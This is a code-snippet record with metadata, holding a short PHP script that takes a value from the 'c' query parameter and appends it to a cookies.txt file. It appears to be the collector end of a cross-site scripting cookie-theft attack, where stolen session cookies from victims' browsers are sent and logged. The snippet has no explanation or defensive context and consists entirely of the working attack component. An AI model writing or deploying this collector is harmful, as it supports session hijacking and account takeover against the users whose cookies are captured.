---
id: aca24532-3c69-4951-943f-e774c7938295
type: code
language: PHP
verified: false
created_at: '2023-04-06T03:56:41.637897+00:00'
updated_at: '2023-04-10T20:21:43.600851+00:00'
---

# Code Snippet aca24532

**Language**: PHP

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```


